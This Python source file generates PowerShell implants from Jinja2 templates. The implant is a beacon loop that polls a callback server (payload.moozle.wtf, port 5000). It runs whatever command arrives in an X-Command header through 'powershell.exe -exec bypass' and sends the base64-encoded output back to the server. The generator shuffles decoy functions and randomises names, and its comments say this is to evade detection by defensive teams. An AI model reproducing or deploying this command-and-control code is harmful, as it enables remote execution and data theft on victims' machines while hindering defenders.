import jinja2
import flask

# aa = flask.render_template("jinja_fudge.ps1", url="malware.moozle.wtf", port=5000)
# jinja2.Template.render("jinja_fudge.ps1")
# print(aa)
from random import shuffle
from jinja2 import Environment, FileSystemLoader


# -- This is now being managed by a decorator
class Implant_Generation():
    def __init__(self):
        return

    play_audio = '''
        function RemotePlayAudio {
    $args[0]
    }
        '''
    update_implant = '''
    function JfaSlt () {}
    '''
    random_function = '''
    function {{ ron.blah }} () {}

    '''
    text = '''
    while($true){
        start-sleep($sleep)
        # write-output "Callback time: $sleep"
        $headers = @{}
        $headers.Add("X-Implant","{{ uii }}")
        try {
            $LoginResponse = Invoke-WebRequest 'http://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
            }
        catch {
            $_.Exception | format-list -Force
        }
        $headers = $LoginResponse.Headers["X-Command"]
        # write-output $headers
        if ( $headers -NotLike "=="){
            if ( $headers -Like "::")
                {
                $SplitHeaders = $heades.Split("::")
                Write-Output $SplitHeaders[2]
                }
            else {
            Write-Output "$headers"
            $tr = powershell.exe -exec bypass -C "$headers"
            $gtr="{{uii}}::"+$tr
            $headers = @{}
            $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
            $headers.Add("X-Result",$b64tr)
            Write-Output $b64tr


            $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'
            }
        }

    }
'''

    def Generate_Function(self):
        a = [self.play_audio, self.random_function, self.update_implant]

        # print(a)
        # -- reorder functions
        shuffle(a)
        # print(a)
        rjif = ""
        for x in a:
            rjif = rjif + x
        rjif = rjif + self.text
        return rjif


a = Implant_Generation()
bb = a.Generate_Function()


# print(bb)


# -- Decorator Function Template
def RandomiseFudgeFunctions(function):
    print("(Dec loading...)")
    def aaa(*args, **kwargs):
        randomise_jinja_template = Implant_Generation.Generate_Function(Implant_Generation())
        #print(randomise_jinja_template)
        print("//",*args,"///")
        return function(*args,randomise_jinja_template)
    return aaa



# -- This will be a mapping of key/pairs which Jinja will inject into template.
# -- Depending on the obfuscation level we will randomise all of the keypair values



class ImplantGenerator():
    # -- This is a breakdown of the JinjaFudge which includes random jinja variables
    JinjaRandomisedArgs = {"blah": "aaaaaa"}
    play_audio = '''
            function RemotePlayAudio {
        $args[0]
        }
            '''
    update_implant = '''
        function JfaSlt () {}
        '''
    random_function = '''
        function {{ ron.blah }} () {}

        '''
    text = '''
        while($true){
            start-sleep($sleep)
            # write-output "Callback time: $sleep"
            $headers = @{}
            $headers.Add("X-Implant","{{ uii }}")
            try {
                $LoginResponse = Invoke-WebRequest 'http://{{url}}:{{port}}/index' -Headers $headers -Body $Body -Method 'POST'
                }
            catch {
                $_.Exception | format-list -Force
            }
            $headers = $LoginResponse.Headers["X-Command"]
            # write-output $headers
            if ( $headers -NotLike "=="){
                if ( $headers -Like "::")
                    {
                    $SplitHeaders = $heades.Split("::")
                    Write-Output $SplitHeaders[2]
                    }
                else {
                Write-Output "$headers"
                $tr = powershell.exe -exec bypass -C "$headers"
                $gtr="{{uii}}::"+$tr
                $headers = @{}
                $b64tr = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($gtr))
                $headers.Add("X-Result",$b64tr)
                Write-Output $b64tr


                $LoginResponse = Invoke-WebRequest 'http://{{ url }}:{{ port }}/help' -Headers $headers -Body $Body -Method 'POST'
                }
            }

        }
    '''

    def Generate_Function(self):
        a = [self.play_audio, self.random_function, self.update_implant]

        # print(a)
        # -- reorder functions
        shuffle(a)
        # print(a)
        rjif = ""
        for x in a:
            rjif = rjif + x
        rjif = rjif + self.text
        return rjif


    def randomise_jinja_variables(self, JinjaRandomisedArgs):
        print("Randomising Jinja2 Variables")
        # -- Iterate over all variables contained within self.JinjaRandomisedArgs and replace the value
        # --    ensure that all variable are unqiue.
        return JinjaRandomisedArgs

    # -- Public Functions
    @RandomiseFudgeFunctions
    def render_implant_(self, JinjaArgs, RandomisedJinjaTemplate):

        if 'obfuscation_level' in JinjaArgs:
            if JinjaArgs['obfuscation_level'] == 2:
                # -- Takes the JinjaRandomisedArgs(JRA) as a based templates, and returns a randomised dictionary
                # This never edits JinjaRandomisedArgs, as this will result in other instansatioed objects using randomised args
                #   which will make Fudge harder to detected in for experience teams.
                JRA = self.randomise_jinja_variables(self.JinjaRandomisedArgs)
            else:

                print("this state cannot exist")
        else:
            JRA = self.JinjaRandomisedArgs
        cc = jinja2.Template(RandomisedJinjaTemplate)
        #print("::", JinjaArgs['callback_url'], JinjaArgs['stager_key'])
        output_from_parsed_template = cc.render(url=JinjaArgs['callback_url'], port=JinjaArgs['port'],
                                                uii=JinjaArgs['unique_implant_id'], ron=JRA)
        print("~~~")
        return output_from_parsed_template




# call something
# fill empty with jinja
#   decorate: randomise functions
#   decorate: randomise variables


b = {"callback_url": "payload.moozle.wtf",
     "stager_key": 12345,
     "port": 5000,
     "unique_implant_id": "abcde"
     }
#HH = ImplantGenerator()
#gg = HH.render_implant_(b)
#print(gg)
#print("End")